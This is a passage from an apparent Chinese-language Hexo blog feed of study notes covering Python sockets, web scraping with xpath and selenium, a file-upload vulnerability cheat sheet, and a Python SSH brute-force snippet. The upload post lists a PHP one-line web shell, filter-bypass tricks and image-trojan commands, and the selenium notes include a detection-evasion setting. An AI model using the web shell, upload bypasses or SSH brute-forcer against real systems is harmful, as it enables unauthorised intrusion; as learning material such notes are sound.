urllib</td></tr><tr><td>SMTP</td><td>发送邮件</td><td>25</td><td>smtplib</td></tr><tr><td>POP3</td><td>接收邮件</td><td>110</td><td>poplib</td></tr><tr><td>IMAP4</td><td>获取邮件</td><td>143</td><td>imaplib</td></tr><tr><td>Telnet</td><td>命令行</td><td>23</td><td>telnetlib</td></tr><tr><td>Gopher</td><td>信息查找</td><td>70</td><td>gopherlib, urllib</td></tr></tbody></table><h2 id="Socket-对象-内建-方法"><a href="#Socket-对象-内建-方法" class="headerlink" title="Socket 对象(内建)方法"></a>Socket 对象(内建)方法</h2><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>服务器端套接字</td><td></td></tr><tr><td>s.bind()</td><td>绑定地址（host,port）到套接字， 在 AF_INET下，以元组（host,port）的形式表示地址。</td></tr><tr><td>s.listen()</td><td>开始 TCP 监听。backlog 指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为 1，大部分应用程序设为 5 就可以了。</td></tr><tr><td>s.accept()</td><td>被动接受TCP客户端连接,(阻塞式)等待连接的到来</td></tr><tr><td>客户端套接字</td><td></td></tr><tr><td>s.connect()</td><td>主动初始化TCP服务器连接，。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</td></tr><tr><td>s.connect_ex()</td><td>connect()函数的扩展版本,出错时返回出错码,而不是抛出异常</td></tr><tr><td>公共用途的套接字函数</td><td></td></tr><tr><td>s.recv()</td><td>接收 TCP 数据，数据以字符串形式返回，bufsize 指定要接收的最大数据量。flag 提供有关消息的其他信息，通常可以忽略。</td></tr><tr><td>s.send()</td><td>发送 TCP 数据，将 string 中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于 string 的字节大小。</td></tr><tr><td>s.sendall()</td><td>完整发送 TCP 数据。将 string 中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回 None，失败则抛出异常。</td></tr><tr><td>s.recvfrom()</td><td>接收 UDP 数据，与 recv() 类似，但返回值是（data,address）。其中 data 是包含接收数据的字符串，address 是发送数据的套接字地址。</td></tr><tr><td>s.sendto()</td><td>发送 UDP 数据，将数据发送到套接字，address 是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</td></tr><tr><td>s.close()</td><td>关闭套接字</td></tr><tr><td>s.getpeername()</td><td>返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</td></tr><tr><td>s.getsockname()</td><td>返回套接字自己的地址。通常是一个元组(ipaddr,port)</td></tr><tr><td>s.setsockopt(level,optname,value)</td><td>设置给定套接字选项的值。</td></tr><tr><td>s.getsockopt(level,optname[.buflen])</td><td>返回套接字选项的值。</td></tr><tr><td>s.settimeout(timeout)</td><td>设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</td></tr><tr><td>s.gettimeout()</td><td>返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</td></tr><tr><td>s.fileno()</td><td>返回套接字的文件描述符。</td></tr><tr><td>s.setblocking(flag)</td><td>如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。</td></tr><tr><td>s.makefile()</td><td>创建一个与该套接字相关连的文件</td></tr></tbody></table><h2 id="简单的实例"><a href="#简单的实例" class="headerlink" title="简单的实例"></a>简单的实例</h2><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server</span>(<span class="params">ip,port</span>):</span><br><span class="line">    s = socket(AF_INET,SOCK_STREAM)  <span class="comment">#创建socket对象</span></span><br><span class="line">    s.bind((ip,port))  <span class="comment">#绑定端口</span></span><br><span class="line">    s.listen(<span class="number">2</span>)  <span class="comment">#设置监听限制</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c,addr = s.accept()  <span class="comment">#建立客户端连接</span></span><br><span class="line">        <span class="built_in">print</span>(addr)</span><br><span class="line">        c.send(<span class="string">&#x27;HELLO~&#x27;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        c.close()  <span class="comment">#关闭连接</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    server(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">7777</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">c.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">7777</span>))</span><br><span class="line"></span><br><span class="line">a = c.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(a.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">c.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>技术基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫</title>
    <link href="/2023/12/01/%E7%88%AC%E8%99%AB/"/>
    <url>/2023/12/01/%E7%88%AC%E8%99%AB/</url>
    
    <content type="html"><![CDATA[<p>python的爬虫操作</p><span id="more"></span><h1 id="一、request"><a href="#一、request" class="headerlink" title="一、request"></a>一、request</h1><p>一会写</p><h1 id="二、xpath"><a href="#二、xpath" class="headerlink" title="二、xpath"></a>二、xpath</h1><p><em>xpath中 [1] 就是第一个元素</em></p><table><thead><tr><th>代码</th><th>含义</th></tr></thead><tbody><tr><td>&#x2F;&#x2F;a</td><td>当前html页面中所有的a标签</td></tr><tr><td>&#x2F;&#x2F;a&#x2F;@href</td><td>当前html页面中所有的a标签href属性（链接）的内容</td></tr><tr><td>&#x2F;&#x2F;a&#x2F;text()</td><td>当前html页面中所有的a标签de文本内容</td></tr><tr><td>&#x2F;&#x2F;img&#x2F;@src</td><td>所有的img标签中src内容</td></tr><tr><td>&#x2F;&#x2F;img[@alt&#x3D;’—‘]&#x2F;@src</td><td>所有的img标签中alt属性为—的src内容</td></tr><tr><td>&#x2F;&#x2F;div[@class&#x3D;’lst-item’][3]&#x2F;a[last()]&#x2F;img&#x2F;@src</td><td>a选取页面中所有div标签下class为lst-item的第三个中最后一个a标签img标签中的src</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><ol><li><p>&#x2F;&#x2F;a                          </p><p> 当前html页面中所有的a标签</p></li><li><p>&#x2F;&#x2F;a&#x2F;@href              </p><p> 当前html页面中所有的a标签href属性（链接）的内容</p></li><li><p>&#x2F;&#x2F;a&#x2F;text()               </p><p> 当前html页面中所有的a标签de文本内容</p></li><li><p>&#x2F;&#x2F;img&#x2F;@src             </p><p>所有的img标签中src内容</p></li><li><p>&#x2F;&#x2F;img[@alt&#x3D;’—‘]&#x2F;@src      </p><p>所有的img标签中alt属性为—的src内容</p></li><li><p>&#x2F;&#x2F;div[@class&#x3D;’lst-item’][3]&#x2F;a[last()]&#x2F;img&#x2F;@src<br>a选取页面中所有div标签下class为lst-item的第三个中最后一个a标签img标签中的src</p></li><li><p>text()                       </p><p>文字</p></li><li><p>&#x2F;&#x2F;a[contains(text(),’下一页’)]&#x2F;@href         </p><p>下一页地址</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;-----&quot;</span></span><br><span class="line">hesders = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;------&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url=url,headers=headers)</span><br><span class="line">html_doc = response.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="comment">#用etree去转化html_doc，转化为一个html对象，此时element对象可以使用xpath语法</span></span><br><span class="line">html = etree.HTML(html_doc)</span><br><span class="line"></span><br><span class="line">xxx = html.xpath(<span class="string">&quot;xpath 语法&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Tips："><a href="#Tips：" class="headerlink" title="Tips："></a><em>Tips：</em></h3><p>不太会怎么办，那就直接去浏览器里的开发者模式复制xpath路径</p><h1 id="三、selenium"><a href="#三、selenium" class="headerlink" title="三、selenium"></a>三、selenium</h1><p><strong>基本操作代码示例</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#键盘按键包</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="comment">#鼠标键盘包</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定调用某个地方的chrome</span></span><br><span class="line">options = webdriver.ChromeOptions()     <span class="comment">#可更换不同的浏览器驱动</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#chrome浏览器主程序的位置</span></span><br><span class="line">location = <span class="string">r&quot;文件路径&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在options增加读取位置</span></span><br><span class="line">options.binary_location = location</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用静默模式</span></span><br><span class="line"><span class="comment">#options.add_argument(&quot;headless&quot;)</span></span><br><span class="line"><span class="comment">#加代理http https socks4 socks5</span></span><br><span class="line"><span class="comment">#options.add_argument(&#x27;--proxy-server=%s&#x27;%&#x27;socks4://1.2.3.4:54321&#x27;)</span></span><br><span class="line"><span class="comment">#更改浏览器语言</span></span><br><span class="line"><span class="comment">#options = add_argument(&quot;--lang=en-US&quot;)</span></span><br><span class="line">driver = webdriver.Chrome(<span class="string">&quot;webdriver地址路径&quot;</span>,options=options)</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置手机型号，可不填为默认</span></span><br><span class="line"><span class="comment">#mobileEmulation = &#123;&quot;devicename&quot;:&quot;手机型号&quot;&#125;</span></span><br><span class="line"><span class="comment">#使用某个手机型号浏览</span></span><br><span class="line"><span class="comment">#options.add_experiment_option(mobileEmulation&#x27;,moblieEmulation)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用get的方法打开一个网站</span></span><br><span class="line">driver.get(<span class="string">&quot;域名&quot;</span>)  <span class="comment">#打开chrome浏览器并打卡某个域名</span></span><br><span class="line">driver.refresh()    <span class="comment">#刷新网页</span></span><br><span class="line">driver.quit()   <span class="comment">#关闭进程</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#根据id找到对应的目标，并发送(输入)文字</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&quot;id名&quot;</span>).send_keys(<span class="string">&quot;内容&quot;</span>)</span><br><span class="line"><span class="comment">#组合键输入</span></span><br><span class="line"><span class="comment">#driver.find_element_by_id(&quot;id名&quot;).send_keys(keys.CONRTOL,&#x27;a&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#根据xpath找到目标，并点击</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">&quot;xpath语法&quot;</span>).click()</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取当前页面地址（尚未切换标签）</span></span><br><span class="line"><span class="built_in">print</span>(driver.current_url)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取当前页面源码</span></span><br><span class="line"><span class="built_in">print</span>(driver.page_source)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取当前页面cookie</span></span><br><span class="line"><span class="built_in">print</span>(driver.get_cookie)</span><br></pre></td></tr></table></figure><p><strong>新版本selenium中，find_element语法有所变化</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="comment"># 先导入一下包</span></span><br><span class="line"></span><br><span class="line">driver.find_element(By.XPATH,<span class="string">&quot;Xpath路径&quot;</span>) </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#鼠标键盘包</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义一个移动并点击鼠标动作</span></span><br><span class="line">action = ActionChains(driver).move_by_offset(<span class="number">70</span>,<span class="number">120</span>).click()</span><br><span class="line"><span class="comment">#开始执行</span></span><br><span class="line">action.perform()</span><br></pre></td></tr></table></figure><h3 id="实现拖拽操作"><a href="#实现拖拽操作" class="headerlink" title="实现拖拽操作"></a><em>实现拖拽操作</em></h3><p>action &#x3D; ActionChain(driver)</p><p>action.drag_and drop(first_tar,second_tar)</p><p>#从第一个位置拖拽到第二个位置</p><h3 id="鼠标点击像素操作"><a href="#鼠标点击像素操作" class="headerlink" title="鼠标点击像素操作"></a><em>鼠标点击像素操作</em></h3><p>ActionChain(driver).move_by_offset(200,300).click().perform()</p><p>ActionChain(driver).move_by_offset(-200,300).perform()    #把鼠标移动回来</p><h3 id="鼠标其他操作："><a href="#鼠标其他操作：" class="headerlink" title="鼠标其他操作："></a><em>鼠标其他操作</em>：</h3><p>click()                         单击鼠标左键</p><p>click_and_hold()         点击鼠标左键不放开</p><p>double_click()             双击鼠标左键</p><p>context_click()            单击鼠标右键</p><p>drag_and_drop_by_offset(first_tar,second_tar)       拖拽到某个位置松开        </p><p>key_down(“—“)         按下一个键</p><p>move_to_element(ele)    移动到某个元素的位置</p><p>move_to_element_by_offset(ele,x,y)   移动到某个元素的相对位置</p><h3 id="1-下拉框操作："><a href="#1-下拉框操作：" class="headerlink" title="1.下拉框操作："></a>1.下拉框操作：</h3><p>#先引入一个包</p><p>from selenium.webdriver.support.ui import Select</p><p>#使用Select包裹起来的xpath值找到下拉框元素</p><p>select1 &#x3D; Select(driver.find_element_by_xpath(“&#x2F;&#x2F;select[@class&#x3D;’—‘]”))</p><p>#选择下拉框的值</p><p>select1.select_by_value(“—“)</p><h3 id="2-新建标签页："><a href="#2-新建标签页：" class="headerlink" title="2.新建标签页："></a>2.新建标签页：</h3><p>js &#x3D; window.open(“baidu.com”)</p><p>driver.execut_script(js)</p><h3 id="3-查看当前页面："><a href="#3-查看当前页面：" class="headerlink" title="3.查看当前页面："></a>3.查看当前页面：</h3><p>print(driver.current_url)</p><h3 id="4-切换选项卡"><a href="#4-切换选项卡" class="headerlink" title="4.切换选项卡"></a>4.切换选项卡</h3><p>driver.switch_to.window(driver.window_handles[1])    #切换到第二个标签页</p><h3 id="5-弹窗处理："><a href="#5-弹窗处理：" class="headerlink" title="5.弹窗处理："></a>5.弹窗处理：</h3><p>driver.switch_to_alert.accept()</p><h3 id="6-iframe处理："><a href="#6-iframe处理：" class="headerlink" title="6.iframe处理："></a>6.iframe处理：</h3><p>#找到并进入iframe标签</p><p>ifra_div &#x3D; driver.find_element_by_tag_name(“iframe”)      #如果有多个iframe，就用elements</p><p>driver.switch_to.frame(ifra_div)               #用[–]选取不同的iframe标签</p><p>#释放iframe，回到主页面</p><p>driver.switch_to_default_content()</p><h3 id="7-获取标签下的文字："><a href="#7-获取标签下的文字：" class="headerlink" title="7.获取标签下的文字："></a>7.获取标签下的文字：</h3><p>get_attribute(‘innerText’)</p><hr><h3 id="8-cookie操作："><a href="#8-cookie操作：" class="headerlink" title="8.cookie操作："></a>8.cookie操作：</h3><p>#查看cookie</p><p>cookie &#x3D; driver.get_cookies()</p><p>print(cookie)</p><p>#增加cookie</p><p>driver.add_cookies({—})</p><p>#清除所有cookie</p><p>driver.delete_all_cookies()</p><h3 id="9-滑动操作："><a href="#9-滑动操作：" class="headerlink" title="9.滑动操作："></a>9.滑动操作：</h3><p>js &#x3D; “document.documentElement.scrollTop&#x3D;10000”</p><p>driver.execute_script(js)</p><h3 id="10-截图操作："><a href="#10-截图操作：" class="headerlink" title="10.截图操作："></a>10.截图操作：</h3><p>#页面直接截图</p><p>driver.get_screenshot_as_file(“.&#x2F;picture.jpg”)</p><p>#base64加密截图</p><p>b &#x3D; driver.get_screenshot_as_base64</p><p>print(b)</p><h3 id="11-浏览器处理："><a href="#11-浏览器处理：" class="headerlink" title="11.浏览器处理："></a>11.浏览器处理：</h3><p>driver.back()           后退</p><p>driver.refresh()        刷新</p><p>driver.forword()      前进</p><h3 id="12-最大化窗口："><a href="#12-最大化窗口：" class="headerlink" title="12.最大化窗口："></a>12.最大化窗口：</h3><p>driver.maximize_window()</p><hr><h3 id="13-超时操作："><a href="#13-超时操作：" class="headerlink" title="13.超时操作："></a>13.超时操作：</h3><p>#引入3个包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br></pre></td></tr></table></figure><p>#如果10s页面还没加载出来，就抛出一个异常，需要配合try来做</p><p>driver.set_pageload_timeout (10)</p><p>#隐性等待，全局查找页面元素的等待时间，如果这个时间没找到指定元素，就抛出异常（全局做一次就好）</p><p>driver.implicitly_wait(2)</p><p>#显性等待</p><p>使用频率最高的元素超时设置</p><p>WebDriverWait(driver,10).until(EC.presence_of_element_located(By.ID,’j-anime-nav’))</p><p>uti1用来检测指定的元素是否出现，如果在超时的时间内出现就返回选择器的信息，否则报TimeOutException</p><p>until_not用来检测指定的元素是否消失，如果在超时时间内消失返回True,否则报TimeOutException</p><p><a href="https://blog.csdn.net/qq_38741986/article/details/91348845">有关selenium的三种等待——CSDN</a></p><h3 id="14-反反selenium："><a href="#14-反反selenium：" class="headerlink" title="14.反反selenium："></a>14.反反selenium：</h3><p>#某些网站会识别selenium</p><p>options.add_experimental_option(‘excludeswitches’,[‘enable-automation’])</p><h3 id="15-图片不加载："><a href="#15-图片不加载：" class="headerlink" title="15.图片不加载："></a>15.图片不加载：</h3><p>适用于只爬文字的爬虫，降低流量消耗，加快速度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">prefs = &#123;</span><br><span class="line"><span class="string">&#x27;profile.default_content_setting_values&#x27;</span>:&#123;</span><br><span class="line"><span class="string">&#x27;images&#x27;</span>:<span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">options.add_experimental_option (<span class="string">&#x27;prefs&#x27;</span>,prefs)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>技术基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="/2023/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<img src="/2023/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/muma.jpg" class title="图片"><span id="more"></span><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="0-1-一句话木马的使用"><a href="#0-1-一句话木马的使用" class="headerlink" title="0.1 一句话木马的使用"></a>0.1 一句话木马的使用</h2><p><code>&lt;?php eval($_POST[&#39;pass&#39;])?&gt;</code></p><p>传入成功后可以用中国菜刀或者蚁剑连接，</p><p>测试可用<code>&lt;?php phpinfo();?&gt;</code></p><h2 id="1-1-前端拦截"><a href="#1-1-前端拦截" class="headerlink" title="1.1 前端拦截"></a>1.1 前端拦截</h2><p>关闭浏览器javascript功能后上传即可</p><h2 id="1-2-MIME文件类型拦截"><a href="#1-2-MIME文件类型拦截" class="headerlink" title="1.2 MIME文件类型拦截"></a>1.2 MIME文件类型拦截</h2><p>用bp抓包，将Content-Type后内容改为image&#x2F;jpeg</p><p>即<code>Content-Type: image/jpeg</code></p><h2 id="1-3-关键字黑名单拦截"><a href="#1-3-关键字黑名单拦截" class="headerlink" title="1.3 关键字黑名单拦截"></a>1.3 关键字黑名单拦截</h2><p>黑名单判断，凡是出现在黑名单的都不让过</p><ul><li>尝试更改同义后缀</li></ul><p>​.php &#x3D;&gt; .php3 .php4 .php5 .pht .phtml </p><ul><li><p>大小写绕过</p><p>.php &#x3D;&gt; .pHp</p></li><li><p>空格，点绕过</p><p>.php &#x3D;&gt; .pHp. .</p></li><li><p>若是删除黑名单中的内容，双写绕过即可</p></li></ul><h2 id="1-4-图片内容检测绕过"><a href="#1-4-图片内容检测绕过" class="headerlink" title="1.4 图片内容检测绕过"></a>1.4 图片内容检测绕过</h2><ul><li><p>.htassess绕过</p><p><code>&lt;FilesMatch “xx”&gt;SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code></p></li><li><p>.user.ini绕过</p><p> <code>auto_prepend_file=xx.jpg </code></p></li><li><p>二次渲染</p><p>对一个图片渲染，然后对比那些地方不会修改，将木马写入</p></li></ul><h2 id="1-5-白名单检测绕过"><a href="#1-5-白名单检测绕过" class="headerlink" title="1.5 白名单检测绕过"></a>1.5 白名单检测绕过</h2><p>加入截断字符xx.php%00.jpg</p><p>POST包中将%00进行urldecode</p><h2 id="1-6-截断上传绕过"><a href="#1-6-截断上传绕过" class="headerlink" title="1.6 截断上传绕过"></a>1.6 截断上传绕过</h2><p>IIS6&#x2F;7&#x2F;7.5解析漏洞，nginx低版本解析漏洞</p><p><code>IIS 5.x/6.0 test.asp/1.jpg muma.asp;.jpg IIS xxx/1.jpg/1.php</code></p><p>nginx低版本解析漏洞</p><p><code>Nginx xxx/1.jpg/1.php xxx/1.jpg%00php xxx/1.jpg%20%00php%20 ⇒ xxx/1.jpg \0php</code></p><p>Apache </p><p><code>1.php.jpg.png</code>从后面向前只有php可以被解析</p><h2 id="1-7-压缩绕过"><a href="#1-7-压缩绕过" class="headerlink" title="1.7 压缩绕过"></a>1.7 压缩绕过</h2><p>php发现.7z .zip .rar .gz压缩文件，会自动解压执行</p><p>x.php.7z可以当做php执行</p><h2 id="2-1-1-图片木马"><a href="#2-1-1-图片木马" class="headerlink" title="2.1.1 图片木马"></a>2.1.1 图片木马</h2><p>图片木马必须配合文件包含使用<br><code>http://127.0.0.1/include.php?file=upload/muma.jpg</code></p><h2 id="2-1-2-图片木马制作"><a href="#2-1-2-图片木马制作" class="headerlink" title="2.1.2 图片木马制作"></a>2.1.2 图片木马制作</h2><p><em>法一：</em></p><p>windows cmd<br><code>copy tu.jpg /b+muma.php /a 2.jpg</code></p><p>linux<br><code>cat tu.jpg muma.php &gt; 2.jpg</code></p><p><em>法二：</em><br>GIF89a<br><?php phpinfo();?><br>保存为gif格式</p><p> <em>法三：</em></p><p>使用c32软件，打开图片拉到最下面，把木马的代码复制进去</p><h2 id="2-1-3-二次渲染绕过"><a href="#2-1-3-二次渲染绕过" class="headerlink" title="2.1.3 二次渲染绕过"></a>2.1.3 二次渲染绕过</h2><p>不推荐使用png和jpg，使用gif</p><p>制作一个gif图，丢进去看看渲染了什么地方没有变，把一句话木马放在那个地方</p><p>同样使用c32</p><h2 id="3-1-bp爆破"><a href="#3-1-bp爆破" class="headerlink" title="3.1 bp爆破"></a>3.1 bp爆破</h2><p>若是先存放文件，然后看看是否合法，不合法删掉</p><p>可以使用bp的intruder模块爆破</p><p>bp抓包–右键—send to intruder–payload选择number，10000次，总有一次在的 Xp</p>]]></content>
    
    
    
    <tags>
      
      <tag>技术基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssh暴力破解方法</title>
    <link href="/2023/10/17/ssh%E7%88%86%E7%A0%B4%E6%96%B9%E6%B3%95/"/>
    <url>/2023/10/17/ssh%E7%88%86%E7%A0%B4%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>使用python进行ssh爆破的基本思路</p><span id="more"></span><p>相关python库：pexpect，pxssh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pexpect <span class="keyword">import</span> pxssh</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Login</span>(<span class="params">server,username,passwd</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s = pxssh.pxssh()</span><br><span class="line">s.login(server,username,passwd)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">Login(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> main()</span><br></pre></td></tr></table></figure><p>加上密码字典即可经行爆破</p>]]></content>
    
    
    
    <tags>
      
      <tag>技术基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/10/17/hello-world/"/>
    <url>/2023/10/17/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a 